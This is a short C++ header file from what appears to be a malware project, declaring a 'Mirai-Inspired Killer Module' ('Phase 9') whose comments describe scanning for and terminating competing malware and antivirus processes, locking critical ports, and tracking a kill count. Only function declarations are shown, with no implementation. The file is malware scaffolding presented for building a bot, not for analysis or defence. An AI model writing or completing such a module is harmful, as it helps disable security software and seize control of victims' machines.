#pragma once
#include <string>

// --- Phase 9: Mirai-Inspired Killer Module ---
// Dominance: terminate competing processes, lock critical ports

// Start the killer loop in a background thread
// Scans for competing malware, AV processes, and port holders
void killer_start();

// Stop the killer loop
void killer_stop();

// Get killer status (running/stopped + kill count)
std::string killer_status();

// One-shot: kill a specific process by name
std::string kill_process(const std::string& proc_name);

// One-shot: list all running processes
std::string list_processes();
